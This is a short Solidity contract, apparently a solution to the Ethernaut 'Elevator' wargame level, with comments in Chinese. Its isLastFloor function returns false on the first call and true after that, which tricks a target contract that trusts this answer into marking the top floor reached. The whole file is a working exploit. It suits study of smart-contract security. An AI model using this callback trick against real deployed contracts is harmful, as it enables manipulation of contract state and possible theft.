// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    uint256 private visitCount = 0;

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (visitCount == 0) {
            // 第一次调用，返回false, _floor不重要
            // 调整visitCount，让后续无法再进入这个分支
            visitCount++;
            return false;
        } else {
            // 后面再调用，会走到这个分支
            return true;
        }
    }

    // 用来触发调用 goTo 函数
    function trigger(address _elevator, uint256 _floor) external {
        Elevator(_elevator).goTo(_floor);
    }
}
